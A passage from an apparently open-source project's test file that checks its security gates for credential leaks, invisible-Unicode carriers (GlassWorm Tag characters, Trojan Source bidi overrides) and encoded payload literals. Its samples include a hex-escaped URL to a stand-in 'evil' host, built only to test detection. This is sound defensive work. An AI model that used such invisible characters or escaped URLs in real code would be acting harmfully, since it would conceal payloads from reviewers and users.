  assert.ok(findings.some((f) => f.kind === "filename" && /\.env/.test(f.file)));
  assert.ok(findings.some((f) => f.kind === "content" && /AWS access key id/.test(f.detail)));
});

test("findCredentialLeaks allows .env.example as a published placeholder", async () => {
  const { mkdtemp, writeFile, mkdir } = await import("node:fs/promises");
  const { tmpdir } = await import("node:os");
  const path = await import("node:path");
  const dir = await mkdtemp(path.join(tmpdir(), "daloy-credleak-ok-"));
  await writeFile(
    path.join(dir, "package.json"),
    JSON.stringify({ name: "examples", version: "0.0.0", files: ["templates"] }),
  );
  await mkdir(path.join(dir, "templates"));
  await writeFile(
    path.join(dir, "templates", ".env.example"),
    "OPENAI_API_KEY=your-key-here\n",
  );
  const findings = await findCredentialLeaks(
    { name: "examples", packageDir: "." },
    dir,
  );
  assert.deepEqual([...findings], []);
});

// ---------- verify-no-invisible-unicode (Aikido GlassWorm gate) ----------

test("scanFileForInvisibleUnicode flags Unicode Tag characters", () => {
  // GlassWorm encodes its eval() payload inside U+E0000–U+E007F.
  const carrier = "const x = 1;" + String.fromCodePoint(0xe0041) + "\n";
  const hits = scanFileForInvisibleUnicode(carrier, true);
  assert.equal(hits.length, 1);
  assert.equal(hits[0]!.codePoint, 0xe0041);
  assert.match(hits[0]!.detail, /Unicode Tag character/);
});

test("scanFileForInvisibleUnicode flags zero-width joiners mid-stream", () => {
  const carrier = "foo" + "\u200B" + "bar" + "\u200D" + "baz\n";
  const hits = scanFileForInvisibleUnicode(carrier, false);
  assert.equal(hits.length, 2);
  assert.equal(hits[0]!.codePoint, 0x200b);
  assert.equal(hits[1]!.codePoint, 0x200d);
});

test("scanFileForInvisibleUnicode flags Trojan Source bidi overrides", () => {
  // RLO is the canonical Trojan-Source carrier.
  const carrier = "if (level) \u202E { /* … */ }\n";
  const hits = scanFileForInvisibleUnicode(carrier, false);
  assert.equal(hits.length, 1);
  assert.equal(hits[0]!.codePoint, 0x202e);
  assert.match(hits[0]!.detail, /Bidi override/);
});

test("scanFileForInvisibleUnicode flags PUA only when scanPua is true", () => {
  const carrier = "x = \uE000;\n"; // BMP PUA
  assert.equal(scanFileForInvisibleUnicode(carrier, false).length, 0);
  const hits = scanFileForInvisibleUnicode(carrier, true);
  assert.equal(hits.length, 1);
  assert.equal(hits[0]!.codePoint, 0xe000);
});

test("scanFileForInvisibleUnicode allows BOM at file start but rejects it mid-stream", () => {
  assert.equal(scanFileForInvisibleUnicode("\uFEFFexport const ok = 1;\n", true).length, 0);
  const hits = scanFileForInvisibleUnicode("export const ok = 1;\uFEFF\n", true);
  assert.equal(hits.length, 1);
  assert.equal(hits[0]!.codePoint, 0xfeff);
});

test("scanFileForInvisibleUnicode does not flag harmless ASCII or normal Unicode", () => {
  const clean = [
    "// Em-dash — and smart quotes “like these” are fine.",
    "const greeting = 'hello world';",
    "export const π = 3.14;",
  ].join("\n");
  assert.equal(scanFileForInvisibleUnicode(clean, true).length, 0);
});

test("FORBIDDEN_CLASSES and PUA_RANGES exports are non-empty and frozen", () => {
  assert.ok(FORBIDDEN_CLASSES.length >= 3);
  assert.ok(Object.isFrozen(FORBIDDEN_CLASSES));
  assert.ok(PUA_RANGES.length >= 3);
  assert.ok(Object.isFrozen(PUA_RANGES));
});

test("verify-no-invisible-unicode accepts the live publishable packages", async () => {
  for (const pkg of INVISIBLE_PUBLISHABLE_PACKAGES) {
    const findings = await findInvisibleUnicodeInPackage(pkg);
    assert.deepEqual(
      [...findings],
      [],
      `${pkg.name} must not ship any invisible-Unicode carrier ` +
        "(see https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode)",
    );
  }
});

test("verify-no-invisible-unicode accepts every in-repo source root", async () => {
  for (const root of ADDITIONAL_SOURCE_ROOTS) {
    const findings = await findInvisibleUnicodeInSourceRoot(root);
    assert.deepEqual(
      [...findings],
      [],
      `${root}/ must not contain any invisible-Unicode carrier`,
    );
  }
});

test("findInvisibleUnicodeInPackage flags a smuggled Tag character in a synthetic package", async () => {
  const { mkdtemp, writeFile, mkdir } = await import("node:fs/promises");
  const { tmpdir } = await import("node:os");
  const path = await import("node:path");
  const dir = await mkdtemp(path.join(tmpdir(), "daloy-invunic-"));
  await writeFile(
    path.join(dir, "package.json"),
    JSON.stringify({ name: "wormy", version: "0.0.0", files: ["dist"] }),
  );
  await mkdir(path.join(dir, "dist"));
  await writeFile(
    path.join(dir, "dist", "index.js"),
    "export const ok = true;" + String.fromCodePoint(0xe0041) + "\n",
  );
  const findings = await findInvisibleUnicodeInPackage(
    { name: "wormy", packageDir: "." },
    dir,
  );
  assert.equal(findings.length, 1);
  assert.equal(findings[0]!.codePoint, 0xe0041);
  assert.match(findings[0]!.detail, /Unicode Tag character/);
});

// ---------- verify-no-encoded-payloads (Socket Obfuscation 101 gate) ----------

test("verify-no-encoded-payloads flags the documented obfuscation carrier shapes", async () => {
  const { findEncodedPayloadLiterals } = await import(
    "../scripts/verify-no-encoded-payloads.js"
  );
  // Build the offending strings at runtime so this very test file does
  // NOT itself contain the carrier shapes (which would trip the live-tree
  // assertion below).
  const hexUrl =
    "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2fexample.com";
  const unicodeUrl =
    "\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002fevil";
  const opaqueBlob = "A".repeat(120) + "B".repeat(120);
  const sample = [
    "// safe: a normal URL literal must not trip the gate",
    'const safeUrl = "https://example.com/api/v1/users";',
    "",
    "// unsafe: 4+ consecutive \\xXX hex escapes hide the URL",
    'const a = "' + hexUrl + '";',
    "",
    "// unsafe: 4+ consecutive \\u00XX unicode escapes hide the URL",
    "const b = '" + unicodeUrl + "';",
    "",
    "// unsafe: opaque 200+ char base64 blob is Fernet-shaped",
    'const c = "' + opaqueBlob + '";',
  ].join("\n");
  const findings = findEncodedPayloadLiterals("sample.ts", sample);
  assert.equal(findings.length, 3, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /hex escapes/);
  assert.match(findings[1]!.reason, /unicode escapes/);
  assert.match(findings[2]!.reason, /opaque base64/);
});

test("verify-no-encoded-payloads ignores plain prose, real URLs, and short hashes", async () => {
  const { findEncodedPayloadLiterals } = await import(
    "../scripts/verify-no-encoded-payloads.js"
  );
  const sample = [
    'const url = "https://daloyjs.dev/docs/security/csrf";',
    'const msg = "Reject \\x00 NUL bytes in headers";',
    'const snow = "\\u2603 a snowman";',
    'const sha = "abc123def4567890abc123def4567890abc123def4567890";',
    'const jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.signature";',
  ].join("\n");
  const findings = findEncodedPayloadLiterals("sample.ts", sample);
  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
});

test("verify-no-encoded-payloads accepts the live src/ and scripts/ trees", async () => {
  const { findEncodedPayloadLiterals } = await import(
    "../scripts/verify-no-encoded-payloads.js"
  );
  const { readFile, readdir } = await import("node:fs/promises");
  const path = await import("node:path");
  async function* walk(dir: string): AsyncGenerator<string> {
    for (const entry of await readdir(dir, { withFileTypes: true })) {
      const child = path.join(dir, entry.name);
      if (entry.isDirectory()) yield* walk(child);
      else if (entry.isFile() && /\.(?:m?ts|m?js|cjs)$/.test(entry.name)) yield child;
    }
  }
  let total = 0;
  for (const root of ["src", "scripts", "bin", "examples"]) {
    const abs = path.resolve(process.cwd(), root);
    try {
      for await (const absolute of walk(abs)) {
        const rel = path.relative(process.cwd(), absolute);
        const text = await readFile(absolute, "utf8");
        total += findEncodedPayloadLiterals(rel, text).length;
      }
    } catch {
      // root may not exist in some checkouts; that's fine.
    }
  }
  assert.equal(
    total,
    0,
    "publishable source roots must remain free of `\\xXX` / `\\u00XX` escape runs and " +
      "opaque base64 blobs; see https://socket.dev/blog/obfuscation-101-the-tricks-behind-malicious-code",
  );
});

